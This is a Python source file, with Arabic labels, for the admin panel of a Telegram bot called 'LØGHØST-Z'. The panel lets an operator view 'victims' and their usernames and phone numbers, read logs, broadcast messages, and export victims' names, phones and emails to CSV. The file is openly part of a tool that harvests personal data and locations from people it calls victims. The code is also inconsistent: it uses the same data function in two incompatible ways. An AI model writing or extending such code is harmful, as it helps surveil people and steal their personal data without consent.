#!/usr/bin/env python3
# 🔱 LØGHØST-Z 💀 – لوحة تحكم المشرف

import json
import csv
import os
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ContextTypes

from database import get_all_data, get_victims_count, get_logs

async def admin_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """لوحة تحكم المشرف"""
    user = update.effective_user
    
    # التحقق من صلاحيات المشرف
    with open("config.json", "r") as f:
        config = json.load(f)
    
    if user.id not in config.get("ADMIN_IDS", []):
        await update.message.reply_text("❌ هذا الأمر للمشرف فقط.")
        return

    keyboard = [
        [InlineKeyboardButton("📊 عرض الضحايا", callback_data="show_victims")],
        [InlineKeyboardButton("📜 عرض السجلات", callback_data="show_logs")],
        [InlineKeyboardButton("📢 إرسال إذاعة", callback_data="broadcast")],
        [InlineKeyboardButton("📥 تصدير CSV", callback_data="export_csv")],
        [InlineKeyboardButton("🔙 رجوع", callback_data="back_main")],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    victims_count = get_victims_count()
    await update.message.reply_text(
        f"👑 **لوحة تحكم المشرف**\n\n"
        f"👥 عدد الضحايا: {victims_count}\n"
        f"📅 آخر تحديث: {__import__('datetime').datetime.now().strftime('%Y-%m-%d %H:%M')}\n\n"
        f"اختر الإجراء:",
        reply_markup=reply_markup,
        parse_mode="Markdown"
    )

async def show_victims(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """عرض قائمة الضحايا"""
    victims = get_all_data()
    if not victims:
        await update.message.reply_text("📭 لا توجد ضحايا حتى الآن.")
        return
    
    msg = "📊 **قائمة الضحايا**\n\n"
    for v in victims[:20]:
        msg += f"🆔 {v[0]} | 👤 {v[1]} | 📱 {v[2] or 'غير متاح'}\n"
    
    if len(victims) > 20:
        msg += f"\n... و {len(victims) - 20} آخرين"
    
    await update.message.reply_text(msg, parse_mode="Markdown")

async def show_logs(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """عرض السجلات"""
    logs = get_logs(limit=20)
    if not logs:
        await update.message.reply_text("📭 لا توجد سجلات.")
        return
    
    msg = "📜 **آخر السجلات**\n\n"
    for log in logs:
        msg += f"🕐 {log[3]} | {log[1]} | {log[2][:30]}\n"
    
    await update.message.reply_text(msg, parse_mode="Markdown")

async def export_csv(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """تصدير البيانات إلى CSV"""
    users, locations, messages = get_all_data()
    
    with open("victims_export.csv", "w", newline="", encoding="utf-8") as f:
        writer = csv.writer(f)
        writer.writerow(["User ID", "Username", "First Name", "Last Name", "Phone", "Email"])
        for user in users:
            writer.writerow(user)
    
    await update.message.reply_document(
        document=open("victims_export.csv", "rb"),
        caption="📊 تقرير الضحايا"
    )
    os.remove("victims_export.csv")